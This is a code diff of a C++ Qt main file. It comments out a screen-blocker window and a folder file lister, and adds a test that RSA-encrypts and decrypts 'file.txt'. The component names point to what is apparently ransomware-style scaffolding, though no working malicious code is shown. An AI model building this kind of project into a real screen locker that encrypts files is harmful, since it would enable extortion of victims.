@@ -1,17 +1,30 @@
 #include <QApplication>
 #include <iostream>
-#include "view/screenblocker.h"
-#include "service/Folderservice.h"
+#include "service/rsaencryptor.h"
+/*#include "view/screenblocker.h"
+#include "service/Folderservice.h"*/
+
+using namespace boost::filesystem;
 
 int main(int argc, char *argv[])
 {
-    QApplication a(argc, argv);
+    /*QApplication a(argc, argv);
     std::string key = "";
 
     FolderService folderservice;
 
-    folderservice.list_files();
+    folderservice.list_files();*/
 
+    path filePath = "file.txt";
+    try {
+        RSAEncryptor encryptor;
+        encryptor.encryptFile(filePath);
+        encryptor.decryptFile(filePath.string() + ".enc");
+    } catch(Exception ex) {
+        std::cout << ex.what()<<std::endl;
+    }
+
+    /*
     ScreenBlocker* screenBlocker = new ScreenBlocker();
     // Set the main window
     screenBlocker->setWindowTitle("My Window");
@@ -27,6 +40,6 @@ int main(int argc, char *argv[])
     if(Qkey != nullptr) {
         key = Qkey.toStdString();
     }
-    std::cout<<key<<std::endl;
+    std::cout<<key<<std::endl;*/
     return 0;
 }
